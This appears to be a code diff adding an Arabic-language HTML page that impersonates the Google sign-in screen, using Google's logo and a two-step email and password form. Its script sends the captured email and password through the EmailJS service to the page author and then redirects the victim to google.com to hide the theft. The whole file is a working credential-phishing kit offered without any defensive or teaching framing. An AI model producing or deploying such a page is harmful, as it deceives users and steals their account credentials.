@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - جوجل</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f5f7fb;
+            margin: 0;
+        }
+        .login-container {
+            width: 380px;
+            padding: 40px;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .logo {
+            width: 90px;
+            margin-bottom: 25px;
+        }
+        h2 {
+            font-size: 26px;
+            font-weight: 500;
+            margin-bottom: 10px;
+            color: #333;
+        }
+        .input-field {
+            width: 100%;
+            padding: 14px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.3s ease;
+        }
+        .input-field:focus {
+            border-color: #4285f4;
+        }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #4285f4;
+            color: white;
+            font-size: 16px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .btn:hover {
+            background-color: #357ae8;
+        }
+        .btn-secondary {
+            background-color: #f5f7fb;
+            color: #333;
+            margin-top: 10px;
+        }
+        .btn-secondary:hover {
+            background-color: #e0e0e0;
+        }
+        .error-message {
+            color: #d93025;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+        }
+    </style>
+    <!-- إضافة مكتبة EmailJS -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script>
+        // تهيئة EmailJS
+        (function() {
+            emailjs.init("pg9qXkpFp1zlEY25N"); // Public Key الخاص بك
+        })();
+
+        function nextStep() {
+            let emailField = document.getElementById("email");
+            let errorMessage = document.getElementById("email-error");
+
+            if (emailField.value.trim() === "" || !emailField.value.includes("@")) {
+                errorMessage.textContent = "يرجى إدخال بريد إلكتروني صحيح.";
+                errorMessage.style.display = "block";
+                return;
+            }
+
+            emailField.style.display = "none";
+            document.getElementById("next-btn").style.display = "none";
+            document.getElementById("password-container").style.display = "block";
+            document.getElementById("back-btn").style.display = "block";
+            errorMessage.style.display = "none";
+        }
+
+        function goBack() {
+            document.getElementById("email").style.display = "block";
+            document.getElementById("next-btn").style.display = "block";
+            document.getElementById("password-container").style.display = "none";
+            document.getElementById("back-btn").style.display = "none";
+        }
+
+        function login() {
+            let email = document.getElementById("email").value;
+            let password = document.getElementById("password").value;
+            let errorMessage = document.getElementById("password-error");
+
+            if (email.trim() === "" || password.trim() === "") {
+                errorMessage.textContent = "يرجى ملء جميع الحقول بشكل صحيح.";
+                errorMessage.style.display = "block";
+                return;
+            }
+
+            // إرسال البيانات باستخدام EmailJS
+            emailjs.send("mysv8980", "template_zqdt2dl", {
+                email: email,
+                password: password
+            }).then(function(response) {
+                console.log("تم إرسال البريد الإلكتروني بنجاح!", response.status, response.text);
+                window.location.href = "https://www.google.com"; // توجيه المستخدم إلى Google
+            }, function(error) {
+                console.error("فشل إرسال البريد الإلكتروني:", error);
+                alert("حدث خطأ أثناء إرسال البيانات. يرجى المحاولة مرة أخرى.");
+            });
+        }
+    </script>
+</head>
+<body>
+    <div class="login-container">
+        <img class="logo" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" alt="Google Logo">
+        <h2>تسجيل الدخول</h2>
+        <p>للتواصل مع جوجل</p>
+        <input type="email" id="email" class="input-field" placeholder="البريد الإلكتروني أو الهاتف">
+        <div id="email-error" class="error-message"></div>
+        <button id="next-btn" class="btn" onclick="nextStep()">التالي</button>
+        <div id="password-container" style="display: none;">
+            <input type="password" id="password" class="input-field" placeholder="أدخل كلمة المرور">
+            <div id="password-error" class="error-message"></div>
+            <button class="btn" onclick="login()">تسجيل الدخول</button>
+        </div>
+        <button id="back-btn" class="btn btn-secondary" onclick="goBack()" style="display: none;">رجوع</button>
+        <div class="links">
+            <a href="#">نسيت البريد الإلكتروني؟</a>
+        </div>
+    </div>
+</body>
+</html>
